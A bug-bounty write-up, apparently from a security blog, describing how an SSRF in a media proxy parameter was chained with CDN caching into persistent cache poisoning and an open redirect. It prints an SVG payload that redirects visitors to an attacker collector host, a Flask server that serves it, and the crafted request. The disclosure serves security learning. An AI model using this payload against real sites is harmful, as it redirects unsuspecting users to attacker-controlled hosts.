---
date: 2025-05-04 10:15:00
---

# SSRF-induced Cache Poisoning Logic Bug Flaw

![alt text](https://thewindghost.github.io/posts/image-post/cache-poisoning-via-fetching-data/1.jpg)

---

## 1. Server-Side Request Forgery (SSRF) Leading to Cache Poisoning

A Server-Side Request Forgery (SSRF) vulnerability was identified in the `url` parameter of the [Proxy Controller](https://inappwebview.dev/docs/webview/proxy-controller/). The root cause is the application’s lack of effective authentication and authorization controls, which allows any user to invoke this functionality.

An attacker can exploit this flaw by supplying an arbitrary domain (attacker-controlled domain), causing the server to interact with external services. However, this vulnerability could not be leveraged to access internal server resources (such as `localhost`) because the application implements a filtering mechanism (`filter`).

![alt text](https://thewindghost.github.io/posts/image-post/cache-poisoning-via-fetching-data/0.jpg)

Because calling internal server resources (localhost) was not possible, `Bugcrowd` downgraded the severity to `P5 (Informational)`, categorizing it as informational rather than a high-risk security issue.

![alt text](https://thewindghost.github.io/posts/image-post/cache-poisoning-via-fetching-data/2.png)

---

## 2. Cache Poisoning Vulnerability

The cache poisoning issue was discovered by analyzing server responses. Headers such as `X-Cache: Hit from CloudFront` and `Age: 5`, together with `Status 200 OK`, indicate that the server uses a CDN (Content Delivery Network) and that content is being cached.

Initially, when I attempted to change the server’s `Content-Type` header to `text/html`, the server returned `Status 400 Bad Request`, as it did not accept that content type.

![alt text](https://thewindghost.github.io/posts/image-post/cache-poisoning-via-fetching-data/4.jpg)

However, when switching to `Content-Type: image/svg+xml`, the server responded with `Status 200 OK`. This demonstrates that the server accepts and successfully processes this content type, which opens the possibility for exploitation.

![alt text](https://thewindghost.github.io/posts/image-post/cache-poisoning-via-fetching-data/3.jpg)

As a result, I successfully performed cache poisoning.

After deeper analysis, I concluded this is not a typical `Cache Poisoning` vulnerability but rather a `Logic Bug Flaw`.

Specifically, the server is programmed to allow requests to a given endpoint up to a maximum of three times. After these three requests, the cache becomes permanently stored. When subsequent users access this endpoint, the server always serves the previously cached malicious content instead of processing the new request. This is a weakness in the application logic rather than a simple configuration error.

Note: I used the tool [requestrepo.com](https://requestrepo.com/) to edit headers during testing.
![alt text](https://thewindghost.github.io/posts/image-post/cache-poisoning-via-fetching-data/5.png)

---

## 3. Impact & Attack Scenario

### Impact

Although the cache poisoning vulnerability allows an attacker to inject malicious content into the cache, direct exploitation to achieve Stored XSS was mitigated by the system’s `CSP (Content Security Policy)`. Therefore, I shifted the investigation to a different, feasible attack scenario.

![alt text](https://thewindghost.github.io/posts/image-post/cache-poisoning-via-fetching-data/8.png)

After analysis, I found that the ability to inject HTML can be abused to perform an Open Redirect by leveraging a `meta` tag.

### Attack Scenario

To demonstrate this scenario, I set up an attacker-controlled server to log incoming requests.

I created a file `poc.xml` on the attacker server with the following content:

`poc.xml`

```xml
<?xml version="1.0" encoding="UTF-8" standalone="no"?>
<svg xmlns="http://www.w3.org/2000/svg" version="1.1">
  <foreignObject width="100%" height="100%">
    <body xmlns="http://www.w3.org/1999/xhtml">
      <meta http-equiv="refresh" content="0; url=https://wcc9fwntbs9o7upj4haqmnxi0960uqif.oastify.com/" />
    </body>
  </foreignObject>
</svg>
```

This file is an `SVG (an XML format)` containing a `<foreignObject>` element that allows embedding HTML. Because of the `namespace http://www.w3.org/1999/xhtml`, the `<meta http-equiv="refresh">` tag is processed by the user’s browser and causes an automatic redirect to an attacker-specified URL.

### Exploitation steps:

1. I set up a malicious server using Flask to serve the `poc.xml` file with the `Content-Type: image/svg+xml` header.

```python
from flask import Flask, make_response
import os

app = Flask(__name__)

@app.route('/poc.xml')
def serve_svg_as_xml():
    file_path = os.path.join(os.getcwd(), 'poc.xml')
    if os.path.exists(file_path):
        with open(file_path, 'rb') as f:
            response = make_response(f.read())
            response.headers.set('Content-Type', 'image/svg+xml')
            return response
    else:
        return "File poc.xml not found!", 404

if __name__ == '__main__':
    app.run(debug=False, host='0.0.0.0', port=5505)
```

2. Using Burp Suite Repeater, I exploited the SSRF by supplying the address of my malicious server (`http://{ip}:{port}/poc.xml`) as the `u` parameter.

```http
GET /media?u=http://Ip-Demo:5505/poc.xml HTTP/2
Host: VulnWeb-demo.com
Cookie: None
Sec-Ch-Ua: "Chromium";v="135", "Not-A.Brand";v="8" Sec-Ch-Ua-Mobile: ?0 Sec-Ch-Ua-Platform: "Windows" Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7 Sec-Fetch-Site: none Sec-Fetch-Mode: navigate Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Priority: u=0, i
```

3. When the vulnerable server (`VulnWeb-demo.com`) made the request, it fetched the entire content of my `poc.xml` and stored it in cache.

![alt text](https://thewindghost.github.io/posts/image-post/cache-poisoning-via-fetching-data/6.jpg)

4. As a result, the server returned the malicious content served from my server.

![alt text](https://thewindghost.github.io/posts/image-post/cache-poisoning-via-fetching-data/7.jpg)

## 4. Flow diagram

### Notes about the vulnerability

This vulnerability can lead to Open Redirect attacks; it may sound low-impact, but the issue is that the payload can become permanently stored in cache. Consequently, every user who accesses that endpoint will be redirected, resulting in a large-scale attack.

![alt text](https://mermaid.ink/img/pako\:eNp9km9vmzAQxr-KdVPe0SzkH5QXkxKyptpSaWqidBr0hQMXsGpsZsyUNOK7z5i2o9M0v7rz73nuTj5fIJEpQgCDwYUJpgNyiQUhMegcC4whMGGKR1pzHYPTQ3uqGD1wrFqN9bToKIXesucXozsvTy-uV_iALMt1hw-Spz2s8aRDyaXq6IeRPT0BZwL_K8A0ww09IF_S5ClTshamfmCUR3tiaIVNLJpmMIhFpmiZk819e7mI9izZseKRXF19Il-ie_xZY6W7dBmFXNbpjTLzP7bqz9FCa9MCVSf4Gt1RzhIm64q8c4atetmF0RbVL1RkX3OBih4YZ_psy4Vdlz_hKvqm5OlMblAnOVlRTa1uZeFtr1lX0sJbC9c9GJpxUWiy3a8_fr_bWNX677F270avSikqtMqdxQtwIFMshUCrGh0oUBW0TeEf34Sqp_aJG-MpqfghZfFqM6vIcgiOlFcmq8uUalwxajZQvN0qFCmq0CxNQzB1fVsEggucIPDd4dz3pvPpyJt57rU7c-AMwWQ8Hk7nnjsZ-7OJe-15jQPPtuto6Huz5jcMZeBn)

## 5. References:

[https://www.w3.org/TR/SVG11/](https://www.w3.org/TR/SVG11/)

[https://www.w3.org/TR/xhtml1/](https://www.w3.org/TR/xhtml1/)

[https://developer.mozilla.org/en-US/docs/Web/SVG/Tutorial/Getting\_Started#serving\_svg](https://developer.mozilla.org/en-US/docs/Web/SVG/Tutorial/Getting_Started#serving_svg)

[https://portswigger.net/web-security/web-cache-poisoning](https://portswigger.net/web-security/web-cache-poisoning)

[https://owasp.org/www-community/attacks/Server\_Side\_Request\_Forgery](https://owasp.org/www-community/attacks/Server_Side_Request_Forgery)

## 6. Proof-of-Concept (POC) - Video

![](https://thewindghost.github.io/posts/image-post/cache-poisoning-via-fetching-data/video.gif)

## 7. Conclusion

This case demonstrates that a vulnerability initially classified as low-severity (P5) can become more dangerous when combined with an application logic flaw. It underscores the importance of not only identifying vulnerabilities but also thoroughly analyzing their operational context to accurately assess the true risk.
